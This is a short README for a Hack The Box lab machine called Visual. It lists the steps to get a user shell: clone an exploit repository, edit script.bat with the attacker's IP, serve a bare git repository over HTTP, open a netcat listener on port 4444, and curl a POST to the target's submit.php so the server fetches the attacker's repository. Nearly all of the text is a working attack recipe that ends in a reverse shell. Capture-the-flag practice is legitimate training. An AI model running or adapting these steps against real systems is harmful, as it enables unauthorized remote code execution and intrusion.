# HTB Visual User exploit

1. ```git --bare clone https://github.com/edpryk/htb-v1su4l-expl01t exploit```
2. Update ```script.bat``` with your IP 
3. ```cd exploit/.git``` 
    - ```git --bare update-server-info``` 
    - ```python3 -m http.server 8000```

4. ```nc -lnvp 4444``` 
5. ```curl visual.htb/submit.php -X POST -d 'gitRepoLink=http://<YOUR_IP>:8000'```